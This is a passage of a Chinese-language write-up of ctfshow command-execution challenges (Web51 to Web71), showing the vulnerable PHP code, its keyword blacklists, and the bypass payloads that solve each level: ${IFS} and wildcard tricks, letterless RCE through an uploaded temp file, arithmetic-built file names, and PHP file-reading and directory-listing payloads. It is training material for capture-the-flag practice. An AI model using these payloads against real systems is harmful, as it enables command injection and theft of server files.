class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>多了tac</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=nl&lt;fl&#x27;&#x27;ag.php||</span><br></pre></td></tr></table></figure><p>查看源代码获取flag</p><h2 id="Web52"><a href="#Web52" class="headerlink" title="Web52"></a>Web52</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>多了 &lt; &gt;</p><p>这里把&lt; 换成 <code>$IFS</code></p><p>这里有个坑 flag.php是空的真正的flag在根目录下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=nl$&#123;IFS&#125;/fl&#x27;&#x27;ag||</span><br></pre></td></tr></table></figure><h2 id="Web53"><a href="#Web53" class="headerlink" title="Web53"></a>Web53</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="meta prompt_">if(isset($</span><span class="language-bash">_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span></span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;</span><br><span class="line">        echo($c);</span><br><span class="line">        $d = system($c);</span><br><span class="line">        echo &quot;&lt;br&gt;&quot;.$d;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &#x27;no&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>直接执行不需要||</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=nl$&#123;IFS&#125;fl&#x27;&#x27;ag.php</span><br></pre></td></tr></table></figure><h2 id="Web54"><a href="#Web54" class="headerlink" title="Web54"></a>Web54</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>彻底过滤了通配符* 用 多个?代替</p><p>nl也被过滤了</p><p>可以使用uniq代替nl</p><blockquote><p>uniq在linux中用来去重 同时也会将去重后的文件内容显示出来</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=uniq$&#123;IFS&#125;f???????</span><br></pre></td></tr></table></figure><p>查看源代码获取flag</p><p>其他姿势</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">可以使用<span class="built_in">mv</span>将flag.php文件移动到其他文件 然后访问文件拿到flag</span></span><br><span class="line">?c=mv$&#123;IFS&#125;fla?.php$&#123;IFS&#125;a.txt</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用执行文件目录+?来绕过被过滤的命令</span></span><br><span class="line">?c=/bin/?at$&#123;IFS&#125;f???????</span><br></pre></td></tr></table></figure><h2 id="Web55"><a href="#Web55" class="headerlink" title="Web55"></a>Web55</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 你们在炫技吗？</span><br><span class="line"><span class="meta prompt_">if(isset($</span><span class="language-bash">_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span></span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>过滤了 字母、分号、反引号、”%09”、”%26”和 &lt;&gt;</p><h3 id="姿势1"><a href="#姿势1" class="headerlink" title="姿势1"></a>姿势1</h3><p>同样是利用bin目录</p><blockquote><p>bin为binary的简写，主要放置系统的必备执行文件，例如:<br>cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar等。 </p></blockquote><p>使用base64对flag.php进行加密 同时使用?绕过字母的限制</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=/???/????64%20????.???  # /bin/base64 flag.php</span><br></pre></td></tr></table></figure><p>base64解密拿到flag</p><h3 id="姿势2"><a href="#姿势2" class="headerlink" title="姿势2"></a>姿势2</h3><p>利用&#x2F;usr&#x2F;bin目录</p><blockquote><p>&#x2F;usr&#x2F;sbin 放置一些用户安装的系统管理的必备程式。</p><p>例如:dhcpd、httpd、imap、in.*d、inetd、lpd、named、netconfig、nmbd、samba、sendmail、squid、swap、tcpd、tcpdump等。</p></blockquote><p>利用bzip2命令把flag.php给压缩然后访问flag.php.bz2下载压缩包 然后解压拿到flag</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=/???/???/????2 ????????  # /usr/bin/bzip2 flag.php</span><br></pre></td></tr></table></figure><h2 id="Web56"><a href="#Web56" class="headerlink" title="Web56"></a>Web56</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>字母和数字都被过滤了</p><p>这里利用无字母RCE </p><p>参考P牛的文章<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇 | 离别歌 (leavesongs.com)</a></p><p><a href="https://blog.csdn.net/qq_46091464/article/details/108513145">https://blog.csdn.net/qq_46091464/article/details/108513145</a></p><p>先构造一个post文件上传包</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST数据包POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://ac1db69c-3219-4621-b76e-040d6e281317.challenge.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--链接是当前打开的题目链接--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>提交1.php抓包</p><p><img src="/posts/999021e8/image-20220329151337441.png" alt="ctfshow命令执行56"></p><p>使用重发器发包拿到flag</p><p>还有师傅写了python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    url = <span class="string">&quot;http://ac1db69c-3219-4621-b76e-040d6e281317.challenge.ctf.show/?c=.+/???/????????[@-[]&quot;</span></span><br><span class="line">    r = requests.post(url, files=&#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&#x27;feng.txt&#x27;</span>, <span class="string">b&#x27;cat flag.php&#x27;</span>)&#125;)</span><br><span class="line">    <span class="keyword">if</span> r.text.find(<span class="string">&quot;flag&quot;</span>) &gt;<span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="Web57"><a href="#Web57" class="headerlink" title="Web57"></a>Web57</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 还能炫的动吗？</span></span><br><span class="line"><span class="comment">//flag in 36.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat &quot;</span>.<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>这里利用 $(( ))与整数运算。想办法构造出36.</p><blockquote><p>双小括号 (( )) 是 Bash Shell 中专门用来进行整数运算的命令，它的效率很高，写法灵活，是企业运维中常用的运算命令。<br>通俗地讲，就是将数学运算表达式放在((和))之间。</p><p>表达式可以只有一个，也可以有多个，多个表达式之间以逗号,分隔。对于多个表达式的情况，以最后一个表达式的值作为整个 (( ))命令的执行结果。</p><p>可以使用<code>$</code>获取 (( )) 命令的结果，这和使用$获得变量值是类似的。</p><p>可以在 (( )) 前面加上<code>$</code>符号获取 (( )) 命令的执行结果，也即获取整个表达式的值。以 c&#x3D;$((a+b)) 为例，即将 a+b 这个表达式的运算结果赋值给变量 c。</p><p>注意，类似 c&#x3D;((a+b)) 这样的写法是错误的，不加$就不能取得表达式的结果。</p></blockquote><p><img src="/posts/999021e8/image-20220329163510711.png" alt="image-20220329163510711"></p><p><img src="/posts/999021e8/image-20220329163742001.png" alt="image-20220329163742001"></p><p><code>$(())</code>是0</p><p><code>$((~$(())))</code>是-1</p><p><code>$(($((~$(())))$((~$(())))))</code>是-2</p><p>这里需要构造36</p><p>也就是要先构造出-37 然后取反</p><p>-37是37个<code>$((~$(())))</code>相加</p><p>最终payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure><h2 id="Web58"><a href="#Web58" class="headerlink" title="Web58"></a>Web58</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>这道题因为disable_functions禁用了system exec popen passthru </p><p>使用读文件函数拿flag</p><blockquote><p>file_get_contents()<br>highlight_file()<br>show_source()<br>fgets()<br>file()<br>readfile()</p></blockquote><p>没有过滤直接用</p><p>注意post提交</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload1</span></span><br><span class="line">c=<span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="comment">#payload2</span></span><br><span class="line">c=<span class="title function_ invoke__">show_source</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="comment">#payload3</span></span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span>(<span class="variable">$b</span>=<span class="title function_ invoke__">fgets</span>(<span class="variable">$a</span>))&#123;<span class="keyword">echo</span> <span class="variable">$b</span>;&#125;</span><br></pre></td></tr></table></figure><h2 id="Web59"><a href="#Web59" class="headerlink" title="Web59"></a>Web59</h2><p>过滤了更多函数</p><blockquote><p>这些还可以用</p><p>highlight_file()<br>show_source()<br>fgets()<br>file()</p></blockquote><p>Web58 payload 通杀</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="title function_ invoke__">show_source</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br></pre></td></tr></table></figure><p>其他payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在源代码</span></span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$a</span>);<span class="keyword">echo</span> <span class="variable">$line</span>;&#125;</span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = <span class="title function_ invoke__">fgetc</span>(<span class="variable">$a</span>);<span class="keyword">echo</span> <span class="variable">$line</span>;&#125;</span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> =<span class="title function_ invoke__">fgetcsv</span>(<span class="variable">$a</span>);<span class="title function_ invoke__">print_r</span>(<span class="variable">$line</span>);&#125;</span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">echo</span> <span class="title function_ invoke__">fread</span>(<span class="variable">$a</span>,<span class="string">&quot;1000&quot;</span>);</span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">echo</span> <span class="title function_ invoke__">fpassthru</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><h2 id="Web60"><a href="#Web60" class="headerlink" title="Web60"></a>Web60</h2><p>Web58 payload 通杀</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="title function_ invoke__">show_source</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br></pre></td></tr></table></figure><p>奇淫技巧</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#通过复制，重命名读取php文件内容  </span></span><br><span class="line"><span class="title function_ invoke__">copy</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;flag.txt&quot;</span>);         </span><br><span class="line"><span class="title function_ invoke__">rename</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;flag.txt&quot;</span>);</span><br><span class="line"><span class="comment">#访问flag.txt </span></span><br></pre></td></tr></table></figure><h2 id="Web61-65"><a href="#Web61-65" class="headerlink" title="Web61-65"></a>Web61-65</h2><p>Web58和Web60 payload 通杀</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="title function_ invoke__">show_source</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="Web66-67"><a href="#Web66-67" class="headerlink" title="Web66-67"></a>Web66-67</h2><p>flag的位置变到了根目录</p><p>show_source()函数被禁用了换成highlight_file()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;/&quot;</span>)); <span class="comment">#查看根目录文件 print_r被过滤可以换var_dump</span></span><br><span class="line"><span class="comment"># 注意根目录是flag.txt</span></span><br><span class="line">c=<span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;/flag.txt&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="Web68"><a href="#Web68" class="headerlink" title="Web68"></a>Web68</h2><p>读文件的所有函数都不能用了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;/&quot;</span>)); <span class="comment"># flag还是在根目录下</span></span><br><span class="line"><span class="comment"># 利用文件包含inculde()读取flag</span></span><br><span class="line">c=<span class="keyword">include</span>(<span class="string">&quot;/flag.txt&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="Web69-70"><a href="#Web69-70" class="headerlink" title="Web69-70"></a>Web69-70</h2><p>var_dump()被禁用了只能使用遍历数组</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 多种遍历数组姿势</span></span><br><span class="line"><span class="comment"># 1</span></span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;/&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$value</span>)&#123;<span class="keyword">echo</span> <span class="variable">$value</span>.<span class="string">&quot;---&quot;</span>;&#125;</span><br><span class="line"><span class="comment"># 2 glob() 函数返回匹配指定模式的文件名或目录。返回的是数组</span></span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">glob</span>(<span class="string">&quot;/*&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$value</span>)&#123;<span class="keyword">echo</span> <span class="variable">$value</span>.<span class="string">&quot;   &quot;</span>;&#125;</span><br><span class="line"><span class="comment"># 3 </span></span><br><span class="line">c=<span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&#x27;glob:///*&#x27;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&quot; &quot;</span>);&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">include</span>(<span class="string">&quot;/flag.txt&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="Web71"><a href="#Web71" class="headerlink" title="Web71"></a>Web71</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">        <span class="title function_ 